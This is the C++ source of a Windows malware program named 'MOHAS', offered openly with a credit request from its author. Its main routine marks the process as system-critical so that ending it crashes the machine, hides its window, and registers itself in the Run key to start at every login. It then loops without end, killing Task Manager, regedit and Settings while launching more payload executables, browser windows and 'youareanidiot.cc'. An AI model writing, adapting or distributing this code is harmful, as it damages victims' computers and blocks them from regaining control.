#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <Windows.h>
#pragma comment(lib, "Winmm.lib")
#include <urlmon.h> 
#pragma comment(lib, "urlmon.lib")
#include <iostream>
#include <fstream>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")
#include <ShlObj.h>
#include <fstream>
/*
PLEASE DONT CHANGE THE NAME OF THIS MALWARE!
IF YOU WANT TO MAKE A REVIEW VIDEO, CONSIDER GIVE ME A CREDIT!
Regards, TkmanDevs (Creator)
*/
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue, // (optional)
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv) 
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, (LPCSTR) lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess() 
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        EnablePriv((LPCSTR) SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}
int main(int argc, char *argv[])
{
    MessageBox(0,"This software is considered as a malware, wish to proceed?","MOHAS",MB_OKCANCEL);
    ProtectProcess(); //Protect the process so it can't be killed by Task Manager
    Sleep(2000);
    ShellExecuteA(GetDesktopWindow(),"open","Mohas4.exe",NULL,NULL,SW_SHOW); //Opening the payloads
    ShellExecuteA(GetDesktopWindow(),"open","Mohas5.exe",NULL,NULL,SW_SHOW); //Opening...
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    TCHAR exepath[MAX_PATH];
    GetModuleFileName(0, exepath, MAX_PATH);
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(
           HKEY_CURRENT_USER,
           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
           0,KEY_WRITE,
           &hKey
       );
       if( ERROR_SUCCESS == lnRes )
       {
          lnRes = RegSetValueEx(hKey,
          "Mohas",
          0,
          REG_SZ,
          (BYTE*) exepath,
          strlen(exepath));
       }
    while(1){ //main loop
        system("taskkill /f /im taskmgr.exe");
        system("taskkill /f /im regedit.exe");
        system("taskkill /f /im settings.exe");
        ShellExecuteA(GetDesktopWindow(),"open","Mohas2.exe",NULL,NULL,SW_SHOW);
        ShellExecute(NULL, "open", "www.youareanidiot.cc", NULL, NULL, SW_SHOWNORMAL);
        ShellExecute(NULL, "open", "www.yourwebsitehere.com", NULL, NULL, SW_SHOWNORMAL);
        ShellExecuteA(GetDesktopWindow(),"open","notepad.exe",NULL,NULL,SW_SHOW);
        ShellExecuteA(GetDesktopWindow(),"open","edge.exe",NULL,NULL,SW_SHOW);
        ShellExecuteA(GetDesktopWindow(),"open","explorer.exe",NULL,NULL,SW_SHOW);
        ShellExecuteA(GetDesktopWindow(),"open","Mohas3.exe",NULL,NULL,SW_SHOW);
        ShellExecuteA(GetDesktopWindow(),"open","mohas.txt",NULL,NULL,SW_SHOW);
        ShellExecuteA(GetDesktopWindow(),"open","mohasblauncher.exe",NULL,NULL,SW_SHOW);
        
  }
  return 0;
}
